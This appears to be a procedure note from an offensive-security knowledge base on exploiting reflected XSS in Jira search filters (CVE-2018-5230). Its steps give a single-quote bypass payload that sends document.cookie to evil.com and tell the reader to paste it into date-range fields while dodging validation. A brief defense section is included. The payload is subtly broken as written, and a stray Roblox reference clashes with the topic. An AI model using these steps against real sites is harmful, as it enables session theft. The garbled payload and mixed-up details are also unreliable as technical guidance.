---
id: proc-uuid-4
tags:
  - xss-injection
  - payload-bypass
  - jira
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.310Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Search-Filters

## Summary

This procedure injects JavaScript payloads into Jira search filter inputs, bypassing basic filters to set up reflected XSS execution.

## Description

Exploiting CVE-2018-5230, payloads like <iframe src='//google.com'></iframe> are entered into fields such as 'Updated Date' ranges. The filter escapes double quotes but not single quotes, allowing bypass. This leads to arbitrary JS execution for cookie theft in the Roblox context.

## Requirements

1. Confirmed vulnerable input fields from prior testing.
2. Knowledge of XSS payloads and bypass techniques.
3. Browser session on the target site.

## Defense

Defensive measures and detection strategies:

- Implement comprehensive input validation and escaping for all attributes.
- Log and monitor anomalous inputs in search forms.

## Objectives

1. Successfully insert executable JavaScript.
2. Bypass existing filters using alternative syntax.
3. Position for payload triggering.

## Instructions

### Step 1: Craft Bypass Payload

**Context**: Design payload to evade double-quote filtering.

Use single quotes: <iframe src='//evil.com/steal?cookie='+document.cookie></iframe>.

> Expected output: Payload ready for injection.

### Step 2: Enter Payload in Fields

**Context**: Inject into vulnerable sections.

In 'More than [] minutes ago' or range fields, paste the payload and avoid triggering pre-submit validation.

> Expected output: Form accepts the input without rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-injection]]
- [[payload-bypass]]
